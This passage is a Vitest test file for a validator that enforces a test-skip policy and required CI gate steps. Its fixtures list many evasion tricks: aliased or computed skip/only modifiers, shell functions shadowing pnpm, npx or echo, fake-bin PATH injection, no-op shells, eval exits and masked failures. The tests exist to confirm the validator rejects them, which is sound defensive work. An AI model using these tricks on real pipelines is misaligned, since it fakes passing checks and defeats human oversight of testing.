import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync, readFileSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import { expect, test } from 'vitest';
import { parse as parseYaml, stringify as stringifyYaml } from 'yaml';

import {
  collectTestSkips,
  validateSkipAllowlist,
  validateSkipPolicy
} from '../../../scripts/validate-test-skip-policy.mjs';

const repositoryRoot = resolve(import.meta.dirname, '../../..');

function writeWorkflowFixture(root, lines, { isolateBashStartup = true } = {}) {
  const source = lines.join('\n');
  const workflow = parseYaml(source);
  if (isolateBashStartup) {
    for (const job of Object.values(workflow?.jobs ?? {})) {
      for (const step of job?.steps ?? []) {
        if (typeof step?.run !== 'string') continue;
        step.env ??= {};
        if (!Object.hasOwn(step.env, 'BASH_ENV')) step.env.BASH_ENV = '/dev/null';
      }
    }
  }
  writeFileSync(
    join(root, '.github', 'workflows', 'ci.yml'),
    isolateBashStartup ? stringifyYaml(workflow) : source
  );
}

test(
  'the repository skip inventory is fully allowlisted and wired to mandatory shards',
  { timeout: 60_000 },
  () => {
    const result = validateSkipPolicy({ root: repositoryRoot });

    expect(result.errors).toEqual([]);
    expect(result.findings).toHaveLength(36);
  }
);

test('a skip inside a fixture string is ignored, while an actual unallowlisted skip fails', () => {
  const root = mkdtempSync(join(tmpdir(), 'cvg-test-skip-policy-'));
  try {
    writeFileSync(
      join(root, 'fixture.test.mjs'),
      [
        "const fixture = \"test.skip('fixture only', () => {});\";",
        "test('actual conditional', { skip: process.env.MISSING_FIXTURE }, () => {});"
      ].join('\n')
    );

    const result = validateSkipAllowlist({
      root,
      policy: { schemaVersion: 1, unapprovedSkipAction: 'fail', allowlist: [] }
    });

    expect(result.findings).toHaveLength(1);
    expect(result.errors).toHaveLength(1);
    expect(result.errors[0]).toMatch(/unapproved or ambiguous option skip/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('computed skip modifiers and focused tests cannot bypass the policy', () => {
  const root = mkdtempSync(join(tmpdir(), 'cvg-test-skip-policy-computed-'));
  try {
    writeFileSync(
      join(root, 'fixture.test.mjs'),
      [
        "test['skip']('computed skip', () => {});",
        "it['skipIf'](process.env.MISSING_FIXTURE, 'conditional', () => {});",
        "test[modifier]('dynamic modifier', () => {});",
        "describe['only']('focused suite', () => {});",
        "test('computed skip option', { ['skip']: true }, () => {});",
        'const t = test;',
        "t.only('focused through alias', () => {});",
        "t[modifier]('computed modifier through alias', () => {});",
        'const { only: focused } = test;',
        "focused('focused through destructuring', () => {});",
        "import { test as importedTest } from 'vitest';",
        "importedTest.only('focused through import alias', () => {});",
        'const importedDynamic = importedTest;',
        "importedDynamic[modifier]('computed modifier through import alias', () => {});"
      ].join('\n')
    );

    const result = validateSkipAllowlist({
      root,
      policy: { schemaVersion: 1, unapprovedSkipAction: 'fail', allowlist: [] }
    });

    expect(result.findings.map((finding) => finding.kind)).toEqual([
      'skip',
      'skipIf',
      'dynamic-test-modifier',
      'only',
      'option',
      'only',
      'dynamic-test-modifier',
      'only',
      'only',
      'dynamic-test-modifier'
    ]);
    expect(result.errors).toHaveLength(10);
    expect(result.errors).toContain(
      'fixture.test.mjs:3 forbidden dynamic-test-modifier test modifier'
    );
    expect(result.errors).toContain('fixture.test.mjs:4 forbidden only test modifier');
    expect(result.errors).toContain('fixture.test.mjs:7 forbidden only test modifier');
    expect(result.errors).toContain('fixture.test.mjs:8 forbidden dynamic-test-modifier test modifier');
    expect(result.errors).toContain('fixture.test.mjs:10 forbidden only test modifier');
    expect(result.errors).toContain('fixture.test.mjs:12 forbidden only test modifier');
    expect(result.errors).toContain('fixture.test.mjs:14 forbidden dynamic-test-modifier test modifier');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('computed test option aliases, unknown keys, spreads and option objects fail closed', () => {
  const root = mkdtempSync(join(tmpdir(), 'cvg-test-skip-policy-option-key-'));
  try {
    writeFileSync(
      join(root, 'fixture.test.mjs'),
      [
        "const skipKey = 'skip';",
        "test('constant alias key', { [skipKey]: true }, () => {});",
        "test('runtime key', { [runtimeKey]: true }, () => {});",
        "test('spread options', { ...runtimeOptions }, () => {});",
        "test('opaque options', runtimeOptions, () => {});",
        "describe('suite option alias', { [skipKey]: true }, () => {});"
      ].join('\n')
    );

    const result = validateSkipAllowlist({
      root,
      policy: { schemaVersion: 1, unapprovedSkipAction: 'fail', allowlist: [] }
    });

    expect(result.findings.map((finding) => finding.kind)).toEqual([
      'dynamic-option-key',
      'dynamic-option-key',
      'dynamic-option-key',
      'dynamic-option-object',
      'dynamic-option-key'
    ]);
    expect(result.errors).toContain('fixture.test.mjs:2 forbidden dynamic-option-key in test options');
    expect(result.errors).toContain('fixture.test.mjs:3 forbidden dynamic-option-key in test options');
    expect(result.errors).toContain('fixture.test.mjs:4 forbidden dynamic-option-key in test options');
    expect(result.errors).toContain('fixture.test.mjs:5 forbidden dynamic-option-object in test options');
    expect(result.errors).toContain('fixture.test.mjs:6 forbidden dynamic-option-key in test options');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('computed destructured test modifier keys fail closed', () => {
  const root = mkdtempSync(join(tmpdir(), 'cvg-test-skip-policy-modifier-key-'));
  try {
    writeFileSync(
      join(root, 'fixture.test.mjs'),
      [
        "const skipKey = 'skip';",
        'const { [skipKey]: maybeSkip } = test;',
        "maybeSkip('aliased dynamic modifier', () => {});"
      ].join('\n')
    );

    const result = validateSkipAllowlist({
      root,
      policy: { schemaVersion: 1, unapprovedSkipAction: 'fail', allowlist: [] }
    });

    expect(result.findings.map((finding) => finding.kind)).toEqual(['dynamic-test-modifier']);
    expect(result.errors).toContain('fixture.test.mjs:2 forbidden dynamic-test-modifier test modifier');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('namespace-import test APIs remain recognized after destructuring or member aliasing', () => {
  const root = mkdtempSync(join(tmpdir(), 'cvg-test-skip-policy-namespace-alias-'));
  try {
    writeFileSync(
      join(root, 'fixture.test.mjs'),
      [
        "import * as v from 'vitest';",
        'const { test: t } = v;',
        "t.only('destructured namespace API', () => {});",
        'const namedTest = v.test;',
        "namedTest.only('member namespace API', () => {});"
      ].join('\n')
    );

    const result = validateSkipAllowlist({
      root,
      policy: { schemaVersion: 1, unapprovedSkipAction: 'fail', allowlist: [] }
    });

    expect(result.findings.map((finding) => finding.kind)).toEqual(['only', 'only']);
    expect(result.errors).toHaveLength(2);
    expect(result.errors).toContain('fixture.test.mjs:3 forbidden only test modifier');
    expect(result.errors).toContain('fixture.test.mjs:5 forbidden only test modifier');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('CommonJS test framework require aliases remain visible to the skip policy', () => {
  const root = mkdtempSync(join(tmpdir(), 'cvg-test-skip-policy-commonjs-'));
  try {
    writeFileSync(
      join(root, 'fixture.test.cjs'),
      [
        "const { test: t } = require('node:test');",
        "t.skip('destructured CommonJS alias', () => {});",
        "const nodeTest = require('node:test');",
        "nodeTest.test('CommonJS namespace option', { skip: true }, () => {});",
        "const skipTest = require('node:test').test.skip;",
        "skipTest('CommonJS member modifier alias', () => {});",
        'const requireAlias = require;',
        "const { test: aliasFromRequire } = requireAlias('node:test');",
        "aliasFromRequire.skip('aliased CommonJS require root', () => {});",
        "const { test: moduleRequireTest } = module.require('node:test');",
        "moduleRequireTest.skip('module.require destructured alias', () => {});",
        'const moduleRequireAlias = module.require;',
        "const { test: testFromModuleRequireAlias } = moduleRequireAlias('node:test');",
        "testFromModuleRequireAlias.skip('aliased module.require root', () => {});"
      ].join('\n')
    );

    const result = validateSkipAllowlist({
      root,
      policy: { schemaVersion: 1, unapprovedSkipAction: 'fail', allowlist: [] }
    });

    expect(result.findings.map((finding) => finding.kind)).toEqual([
      'skip', 'option', 'skip', 'skip', 'skip', 'skip'
    ]);
    expect(result.errors).toHaveLength(6);
    expect(result.errors).toContain('fixture.test.cjs:2 unapproved or ambiguous skip skip (\'destructured CommonJS alias\')');
    expect(result.errors).toContain('fixture.test.cjs:4 unapproved or ambiguous option skip (true)');
    expect(result.errors).toContain('fixture.test.cjs:6 unapproved or ambiguous skip skip (\'CommonJS member modifier alias\')');
    expect(result.errors).toContain('fixture.test.cjs:9 unapproved or ambiguous skip skip (\'aliased CommonJS require root\')');
    expect(result.errors).toContain('fixture.test.cjs:11 unapproved or ambiguous skip skip (\'module.require destructured alias\')');
    expect(result.errors).toContain('fixture.test.cjs:14 unapproved or ambiguous skip skip (\'aliased module.require root\')');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('dynamic imports and modifier aliases in opaque containers fail closed', () => {
  const root = mkdtempSync(join(tmpdir(), 'cvg-test-skip-policy-dynamic-import-'));
  try {
    writeFileSync(
      join(root, 'fixture.test.mjs'),
      [
        "const { test: dynamicTest } = await import('node:test');",
        "dynamicTest.skip('dynamic import destructuring', () => {});",
        "const nodeTest = await import('node:test');",
        "nodeTest.test.skip('dynamic import namespace', () => {});",
        "import { test } from 'node:test';",
        'const { skip: defaultedSkip = () => {} } = test;',
        "defaultedSkip('defaulted modifier alias', () => {});",
        'const [arraySkip] = [test.skip];',
        "arraySkip('array modifier holder', () => {});",
        'const skipHolder = { skip: test.skip };',
        "skipHolder.skip('object modifier holder', () => {});",
        'register(defaultedSkip);'
      ].join('\n')
    );

    const result = validateSkipAllowlist({
      root,
      policy: { schemaVersion: 1, unapprovedSkipAction: 'fail', allowlist: [] }
    });

    expect(result.findings.map((finding) => finding.kind)).toEqual([
      'skip', 'skip', 'skip', 'dynamic-test-modifier', 'dynamic-test-modifier', 'dynamic-test-modifier'
    ]);
    expect(result.errors).toHaveLength(6);
    expect(result.errors).toContain(
      "fixture.test.mjs:2 unapproved or ambiguous skip skip ('dynamic import destructuring')"
    );
    expect(result.errors).toContain(
      'fixture.test.mjs:8 forbidden dynamic-test-modifier test modifier'
    );
    expect(result.errors).toContain(
      'fixture.test.mjs:10 forbidden dynamic-test-modifier test modifier'
    );
    expect(result.errors).toContain(
      'fixture.test.mjs:12 forbidden dynamic-test-modifier test modifier'
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('test framework namespace aliases fail closed when they escape containers', () => {
  const root = mkdtempSync(join(tmpdir(), 'cvg-test-skip-policy-namespace-escape-'));
  try {
    writeFileSync(
      join(root, 'fixture.test.mjs'),
      [
        "const m = await import('node:test');",
        'const spread = { ...m };',
        "spread.test.skip('spread namespace', () => {});",
        'const object = { namespace: m };',
        "object.namespace.test.only('object namespace', () => {});",
        'const array = [m];',
        "array[0].test.skip('array namespace', () => {});",
        'register(m);',
        'const memberContainer = { api: m.test };',
        "memberContainer.api.skip('member namespace', () => {});",
        "const directSpread = { ...await import('vitest') };",
        "directSpread.test.skip('direct import spread', () => {});",
        "const copied = { ...require('node:test') };",
        "copied.test.skip('inline CommonJS namespace spread', () => {});"
      ].join('\n')
    );

    const result = validateSkipAllowlist({
      root,
      policy: { schemaVersion: 1, unapprovedSkipAction: 'fail', allowlist: [] }
    });

    expect(result.findings.map((finding) => finding.kind)).toEqual(Array(7).fill('dynamic-test-modifier'));
    expect(result.findings.map((finding) => finding.line)).toEqual([2, 4, 6, 8, 9, 11, 13]);
    expect(result.errors).toHaveLength(7);
    expect(result.errors).toContain('fixture.test.mjs:2 forbidden dynamic-test-modifier test modifier');
    expect(result.errors).toContain('fixture.test.mjs:11 forbidden dynamic-test-modifier test modifier');
    expect(result.errors).toContain('fixture.test.mjs:13 forbidden dynamic-test-modifier test modifier');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('every required critical coverage shard must have a policy gate entry', () => {
  const root = mkdtempSync(join(tmpdir(), 'cvg-test-skip-policy-shard-crosswalk-'));
  try {
    mkdirSync(join(root, '.github', 'workflows'), { recursive: true });
    mkdirSync(join(root, 'docs', 'engineering'), { recursive: true });
    mkdirSync(join(root, 'scripts'));
    writeFileSync(join(root, '.github', 'workflows', 'ci.yml'), 'jobs: {}\n');
    writeFileSync(join(root, 'package.json'), JSON.stringify({ scripts: {
      'validate:test-skips': 'node scripts/validate-test-skip-policy.mjs'
    } }));
    writeFileSync(join(root, 'docs', 'engineering', 'test-skip-policy.json'), JSON.stringify({
      schemaVersion: 1,
      unapprovedSkipAction: 'fail',
      requiredShards: [],
      allowlist: []
    }));
    writeFileSync(join(root, 'docs', 'engineering', 'critical-coverage-scope.json'), JSON.stringify({
      requiredShards: ['critical-process', 'vitest-integration'],
      processTests: [],
      vitestTests: []
    }));
    writeFileSync(join(root, 'scripts', 'validate-test-skip-policy.mjs'), '');

    const result = validateSkipPolicy({ root });

    expect(result.errors).toContain(
      'critical manifest required shard critical-process has no policy runner coverage'
    );
    expect(result.errors).toContain(
      'critical manifest required shard vitest-integration has no policy runner coverage'
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('opaque shell setup and shadowed pnpm commands cannot satisfy mandatory gates', () => {
  const root = mkdtempSync(join(tmpdir(), 'cvg-test-skip-policy-shell-ownership-'));
  try {
    mkdirSync(join(root, '.github', 'workflows'), { recursive: true });
    mkdirSync(join(root, 'docs', 'engineering'), { recursive: true });
    mkdirSync(join(root, 'tests'), { recursive: true });
    writeFileSync(join(root, 'package.json'), JSON.stringify({ scripts: {
      'validate:test-skips': 'node scripts/validate-test-skip-policy.mjs'
    } }));
    writeFileSync(join(root, 'tests', 'fixture.test.cjs'), "test.skip('approved fixture', () => {});\n");
    writeFileSync(join(root, 'docs', 'engineering', 'critical-coverage-scope.json'), JSON.stringify({
      requiredShards: ['critical-process'],
      processTests: ['tests/fixture.test.cjs'],
      vitestTests: []
    }));
    writeFileSync(join(root, 'docs', 'engineering', 'test-skip-policy.json'), JSON.stringify({
      schemaVersion: 1,
      unapprovedSkipAction: 'fail',
      requiredShards: [{
        id: 'fixture-critical',
        runner: 'critical-process',
        workflowJob: 'critical',
        requiredText: ['run: pnpm run fixture'],
        paths: ['tests/fixture.test.cjs']
      }],
      allowlist: [{
        path: 'tests/fixture.test.cjs',
        kind: 'skip',
        callee: 'test',
        condition: "'approved fixture'",
        count: 1,
        shard: 'fixture-critical'
      }]
    }));

    const scenarios = [
      {
        name: 'a previous sourced step',
        steps: [
          '      - name: Source shell setup',
          '        run: source "${RUNNER_TEMP}/setup.sh"',
          '      - name: Required command',
          '        run: pnpm run fixture'
        ]
      },
      {
        name: 'a shadowed pnpm executable',
        steps: [
          '      - name: Required command with shell function shadow',
          '        run: |',
          '          pnpm() { :; }',
          '          pnpm run fixture'
        ]
      },
      {
        name: 'an executable bash heredoc',
        steps: [
          '      - name: Opaque shell script',
          '        run: |',
          "          bash -se <<'EOF'",
          '          echo "/tmp/fakebin" >> "$GITHUB_PATH"',
          '          EOF'
        ]
      },
      {
        name: 'builtin alias shadowing',
        steps: [
          '      - name: Required command with builtin alias shadow',
          '        run: |',
          '          shopt -s expand_aliases',
          '          builtin alias pnpm=true',
          '          pnpm run fixture'
        ]
      },
      {
        name: 'dynamically named PATH export',
        steps: [
          '      - name: Required command with dynamically named PATH export',
          '        run: |',
          '          key=PA',
          '          key+=TH',
          '          export "$key=/tmp/fakebin"',
          '          pnpm run fixture'
        ]
      },
      {
        name: 'quoted PATH mutation',
        steps: [
          '      - name: Required command with quoted PATH mutation',
          '        run: |',
          '          read -r "PATH" <<< "/tmp/fakebin"',
          '          pnpm run fixture'
        ]
      }
    ];

    for (const scenario of scenarios) {
      writeWorkflowFixture(root, [
        'jobs:',
        '  critical:',
        '    steps:',
        ...scenario.steps
      ]);
      const result = validateSkipPolicy({ root });
      if (scenario.name !== 'quoted PATH mutation') {
        expect(result.errors, scenario.name).toContain(
          'fixture-critical CI job sets an unsafe shell startup or command-resolution environment'
        );
      }
      expect(result.errors, scenario.name).toContain(
        'fixture-critical CI job is missing executable step text: run: pnpm run fixture'
      );
    }

    const unsafeShellFixtures = [
      {
        name: 'a custom shell on the required step',
        lines: [
          'jobs:',
          '  critical:',
          '    steps:',
          '      - name: Required command with a no-op shell',
          '        shell: "true {0}"',
          '        run: pnpm run fixture'
        ]
      },
      {
        name: 'an unsafe workflow run default',
        lines: [
          'defaults:',
          '  run:',
          '    shell: "true {0}"',
          'jobs:',
          '  critical:',
          '    steps:',
          '      - name: Required command',
          '        run: pnpm run fixture'
        ]
      },
      {
        name: 'an unsafe job run default',
        lines: [
          'jobs:',
          '  critical:',
          '    defaults:',
          '      run:',
          '        shell: "true {0}"',
          '    steps:',
          '      - name: Required command',
          '        run: pnpm run fixture'
        ]
      }
    ];

    for (const scenario of unsafeShellFixtures) {
      writeWorkflowFixture(root, scenario.lines);
      const result = validateSkipPolicy({ root });
      expect(result.errors, scenario.name).toContain(
        'fixture-critical CI job is missing executable step text: run: pnpm run fixture'
      );
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('a shell function cannot shadow a required Playwright executable', () => {
  const root = mkdtempSync(join(tmpdir(), 'cvg-test-skip-policy-e2e-shadow-'));
  try {
    mkdirSync(join(root, '.github', 'workflows'), { recursive: true });
    mkdirSync(join(root, 'docs', 'engineering'), { recursive: true });
    mkdirSync(join(root, 'scripts'), { recursive: true });
    mkdirSync(join(root, 'tests'), { recursive: true });
    writeFileSync(join(root, 'package.json'), JSON.stringify({ scripts: {
      'validate:test-skips': 'node scripts/validate-test-skip-policy.mjs'
    } }));
    writeFileSync(join(root, 'tests', 'playwright.test.cjs'), 'module.exports = {};\n');
    writeFileSync(join(root, 'docs', 'engineering', 'critical-coverage-scope.json'), JSON.stringify({
      requiredShards: [],
      processTests: [],
      vitestTests: []
    }));
    writeFileSync(join(root, 'docs', 'engineering', 'test-skip-policy.json'), JSON.stringify({
      schemaVersion: 1,
      unapprovedSkipAction: 'fail',
      requiredShards: [{
        id: 'fixture-e2e',
        runner: 'playwright-postgresql',
        workflowJob: 'e2e',
        requiredText: ['npx playwright test'],
        paths: ['tests/playwright.test.cjs']
      }],
      allowlist: []
    }));

    writeWorkflowFixture(root, [
      'jobs:',
      '  e2e:',
      '    steps:',
      '      - name: Shadow required Playwright executable',
      '        run: |',
      '          npx() { :; }',
      '          npx playwright test'
    ]);

    const result = validateSkipPolicy({ root });

    expect(result.errors).toContain(
      'fixture-e2e CI job is missing executable step text: npx playwright test'
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('direct, imported and namespace x/f test APIs fail closed', () => {
  const root = mkdtempSync(join(tmpdir(), 'cvg-test-skip-policy-xf-api-'));
  try {
    writeFileSync(
      join(root, 'fixture.test.mjs'),
      [
        "import * as v from 'vitest';",
        "xit('direct xit', () => {});",
        "xdescribe('direct xdescribe', () => {});",
        "fit('direct fit', () => {});",
        "fdescribe('direct fdescribe', () => {});",
        "v.xit('namespace xit', () => {});",
        "v.xdescribe('namespace xdescribe', () => {});",
        'const { xit: skippedTest, fdescribe: focusedSuite } = v;',
        "skippedTest('destructured xit', () => {});",
        "focusedSuite('destructured fdescribe', () => {});"
      ].join('\n')
    );

    const result = validateSkipAllowlist({
      root,
      policy: { schemaVersion: 1, unapprovedSkipAction: 'fail', allowlist: [] }
    });

    expect(result.findings.map((finding) => finding.kind)).toEqual([
      'skip', 'skip', 'only', 'only', 'skip', 'skip', 'skip', 'only'
    ]);
    expect(result.errors).toHaveLength(8);
    expect(result.errors).toContain(
      'fixture.test.mjs:2 unapproved or ambiguous skip skip (\'direct xit\')'
    );
    expect(result.errors).toContain('fixture.test.mjs:4 forbidden only test modifier');
    expect(result.errors).toContain('fixture.test.mjs:10 forbidden only test modifier');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('test discovery and shard validation reject symlink paths and YAML comment decoys', () => {
  if (process.platform === 'win32') return;
  const root = mkdtempSync(join(tmpdir(), 'cvg-test-skip-policy-symlink-'));
  try {
    mkdirSync(join(root, '.github', 'workflows'), { recursive: true });
    mkdirSync(join(root, 'docs', 'engineering'), { recursive: true });
    mkdirSync(join(root, 'tests'), { recursive: true });
    writeFileSync(join(root, 'tests', 'real.test.mjs'), "test('real file', () => {});\n");
    symlinkSync('real.test.mjs', join(root, 'tests', 'fixture.test.mjs'));
    writeFileSync(join(root, 'package.json'), JSON.stringify({ scripts: {
      'validate:test-skips': 'node scripts/validate-test-skip-policy.mjs'
    } }));
    writeFileSync(join(root, 'docs', 'engineering', 'test-skip-policy.json'), JSON.stringify({
      schemaVersion: 1,
      unapprovedSkipAction: 'fail',
      requiredShards: [{
        id: 'fixture',
        runner: 'critical-process',
        workflowJob: 'critical',
        requiredEnv: { REQUIRE_TEST_DB: "'1'" },
        requiredText: [
          'run: pnpm run fixture',
          'run: pnpm run secondary-fixture',
          'run: pnpm run quote-fixture',
          'run: pnpm run masked-fixture',
          'run: pnpm run semicolon-fixture',
          'run: pnpm run disabled-fixture',
          'run: pnpm run ignored-fixture',
          'run: pnpm run job-disabled-fixture',
          'run: pnpm run exit-disabled-fixture',
          'run: pnpm run return-disabled-fixture',
          'run: pnpm run exec-disabled-fixture',
          'run: pnpm run and-disabled-fixture',
          'run: pnpm run or-disabled-fixture',
          'run: pnpm run errexit-disabled-fixture',
          'run: pnpm run eval-disabled-fixture',
          'run: pnpm run unsafe-function-disabled-fixture',
          'run: run_vitest_shard vitest-integration',
          'REDIS_SERVER_BIN=${redis_server}'
        ],
        paths: ['tests/fixture.test.mjs']
      }],
      allowlist: []
    }));
    writeFileSync(join(root, 'docs', 'engineering', 'critical-coverage-scope.json'), JSON.stringify({
      requiredShards: ['critical-process'],
      processTests: ['tests/fixture.test.mjs'],
      vitestTests: []
    }));
    const validVitestHelper = [
      'run_vitest_shard() {',
      '  local shard="$1"',
      '  if node scripts/run-critical-coverage-shard.mjs "${shard}"; then',
      '    if node scripts/promote-critical-shard.mjs --shard "${shard}"; then',
      '      :',
      '    else',
      '      overall_status=1',
      '    fi',
      '  else',
      '    overall_status=1',
      '  fi',
      '}'
    ];
    const validRedisSetupAndExport = [
      'set -euo pipefail',
      'runtime_root="${RUNNER_TEMP}/critical-coverage-runtime"',
      'redis_server="${runtime_root}/usr/bin/redis-server"',
      'test -x "${redis_server}"',
      '{',
      '  echo "REDIS_SERVER_BIN=${redis_server}"',
      '} >> "${GITHUB_ENV}"'
    ];
    const validNativePostgresSetupAndExport = [
      'set -euo pipefail',
      'deb_dir="${RUNNER_TEMP}/critical-coverage-debs"',
      'runtime_root="${RUNNER_TEMP}/critical-coverage-runtime"',
      'docker run --rm --interactive --volume "${deb_dir}:/out" ubuntu:22.04@sha256:829f6df217bcbae2b371026e81711d1a787c61b2967ad09d015063663ebafbf7 bash -se < scripts/provision-private-coverage-binaries.sh',
      'mapfile -t packages < "${deb_dir}/package-manifest"',
      'test "${#packages[@]}" -eq 13',
      'for package in "${packages[@]}"; do',
      'deb="$(find "${deb_dir}" -maxdepth 1 -type f -name "${package}_*.deb" -print -quit)"',
      'test -n "${deb}"',
      'dpkg-deb -x "${deb}" "${runtime_root}"',
      'done',
      'pg_bin="$(find "${runtime_root}/usr/lib/postgresql" -type f -name initdb -printf \'%h\\n\' -quit)"',
      'pg_share="$(find "${runtime_root}/usr/share/postgresql" -type f -name postgres.bki -printf \'%h\\n\' -quit)"',
      'runtime_lib="${runtime_root}/usr/lib/x86_64-linux-gnu"',
      'redis_server="${runtime_root}/usr/bin/redis-server"',
      'redis_cli="${runtime_root}/usr/bin/redis-cli"',
      'test -n "${pg_bin}"',
      'test -n "${pg_share}"',
      'test -x "${pg_bin}/initdb"',
      'test -x "${pg_bin}/postgres"',
      'test -x "${pg_bin}/pg_isready"',
      'test -d "${pg_share}"',
      'test -x "${redis_server}"',
      'test -x "${redis_cli}"',
      '{',
      '  echo "NATIVE_POSTGRES_BIN=${pg_bin}"',
      '  echo "NATIVE_POSTGRES_SHARE=${pg_share}"',
      '  echo "NATIVE_POSTGRES_LIB=${runtime_lib}"',
      '  echo "REDIS_SERVER_BIN=${redis_server}"',
      '  echo "REDIS_CLI_BIN=${redis_cli}"',
      '  echo "REDIS_SERVER_LIBRARY_PATH=${runtime_lib}"',
      '  echo "LD_LIBRARY_PATH=${runtime_lib}"',
      '  echo "PATH=${PATH}:${pg_bin}:${runtime_root}/usr/bin"',
      '} >> "${GITHUB_ENV}"',
      'LD_LIBRARY_PATH="${runtime_lib}" "${pg_bin}/postgres" --version',
      'LD_LIBRARY_PATH="${runtime_lib}" "${redis_server}" --version'
    ];
    writeWorkflowFixture(root, [
      'jobs:',
      '  critical:',
      '    steps:',
      '      - name: Non-executable decoys',
      '        run: |',
      "          cat <<'EOF'",
      '          pnpm run secondary-fixture',
      '          EOF',
      "          cat <<'EXPORT_EOF'",
      '          { echo "REDIS_SERVER_BIN=${redis_server}"; } >> "${GITHUB_ENV}"',
      '          EXPORT_EOF',
      "          echo '",
      '          pnpm run fixture',
      "          '",
      '          echo "',
      '          pnpm run quote-fixture',
      '          "',
      "          { echo '",
      '          echo "REDIS_SERVER_BIN=${redis_server}"',
      "          '",
      '          } >> "${GITHUB_ENV}"',
      '          # pnpm run fixture',
      '          echo "no required shard"',
      '          echo "REDIS_SERVER_BIN=${redis_server}"',
      '          pnpm run masked-fixture || true',
      '          pnpm run semicolon-fixture; echo masked',
      '      - name: Exit before required shard',
      '        run: |',
      '          exit 0',
      '          pnpm run exit-disabled-fixture',
      '      - name: Return before required shard',
      '        run: |',
      '          return 0',
      '          pnpm run return-disabled-fixture',
      '      - name: Exec before required shard',
      '        run: |',
      '          exec false',
      '          pnpm run exec-disabled-fixture',
      '      - name: Continued AND command',
      '        run: |',
      '          false &&',
      '          pnpm run and-disabled-fixture',
      '      - name: Continued OR command',
      '        run: |',
      '          true ||',
      '          pnpm run or-disabled-fixture',
      '      - name: Errexit disabled',
      '        run: |',
      '          set +e',
      '          pnpm run errexit-disabled-fixture',
      '      - name: Eval before required shard',
      '        run: |',
      "          eval 'exit 0'",
      '          pnpm run eval-disabled-fixture',
      '      - name: Call function with opaque exit',
      '        run: |',
      "          quit_now() { eval 'exit 0'; }",
      '          quit_now',
      '          pnpm run unsafe-function-disabled-fixture',
      '      - name: Empty critical helper',
      '        run: |',
      '          run_vitest_shard() { :; }',
      '          run_vitest_shard vitest-integration',
      '      - name: Critical helper with shadowed node',
      '        run: |',
      '          node() { :; }',
      '          run_vitest_shard() {',
      '            if node scripts/run-critical-coverage-shard.mjs "${shard}"; then',
      '              :',
      '            else',
      '              overall_status=1',
      '            fi',
      '          }',
      '          run_vitest_shard vitest-integration',
      '          exit "${overall_status}"',
      '      - name: Redis export after eval',
      '        run: |',
      "          eval 'exit 0'",
      '          {',
      '            echo "REDIS_SERVER_BIN=${redis_server}"',
      '          } >> "${GITHUB_ENV}"',
      '      - name: Redis export after eval in group',
      '        run: |',
      '          {',
      "            eval 'exit 0'",
      '            echo "REDIS_SERVER_BIN=${redis_server}"',
      '          } >> "${GITHUB_ENV}"',
      '      - name: Redis export with shadowed echo',
      '        run: |',
      '          echo() { :; }',
      '          {',
      '            echo "REDIS_SERVER_BIN=${redis_server}"',
      '          } >> "${GITHUB_ENV}"',
      '      - name: Redis export after script exit',
      '        run: |',
      '          exit 0',
      '          {',
      '            echo "REDIS_SERVER_BIN=${redis_server}"',
      '          } >> "${GITHUB_ENV}"',
      '      - name: Redis export after exit',
      '        run: |',
      '          {',
      '            exit 0',
      '            echo "REDIS_SERVER_BIN=${redis_server}"',
      '          } >> "${GITHUB_ENV}"',
      '      - name: Disabled shard command',
      '        if: false',
      '        run: pnpm run disabled-fixture',
      '      - name: Ignored shard failure',
      '        continue-on-error: true',
      '        run: pnpm run ignored-fixture',
      '      - name: Disabled Redis export',
      '        if: false',
      '        run: |',
      '          {',
      '            echo "REDIS_SERVER_BIN=${redis_server}"',
      '          } >> "${GITHUB_ENV}"',
      "        # REQUIRE_TEST_DB: '1'"
    ]);

    const discovery = collectTestSkips(root);
    const result = validateSkipPolicy({ root });

    expect(discovery.parseErrors).toContain('tests/fixture.test.mjs is a symbolic link');
    expect(result.errors).toContain('fixture CI job is missing executable step text: run: pnpm run fixture');
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: run: pnpm run secondary-fixture'
    );
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: run: pnpm run quote-fixture'
    );
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: run: pnpm run masked-fixture'
    );
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: run: pnpm run semicolon-fixture'
    );
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: run: pnpm run exit-disabled-fixture'
    );
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: run: pnpm run return-disabled-fixture'
    );
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: run: pnpm run exec-disabled-fixture'
    );
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: run: pnpm run and-disabled-fixture'
    );
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: run: pnpm run or-disabled-fixture'
    );
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: run: pnpm run errexit-disabled-fixture'
    );
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: run: pnpm run eval-disabled-fixture'
    );
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: run: pnpm run unsafe-function-disabled-fixture'
    );
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: run: run_vitest_shard vitest-integration'
    );
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: run: pnpm run disabled-fixture'
    );
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: run: pnpm run ignored-fixture'
    );
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );
    expect(result.errors).toContain(
      'fixture CI job is missing executable step text: REDIS_SERVER_BIN=${redis_server}'
    );
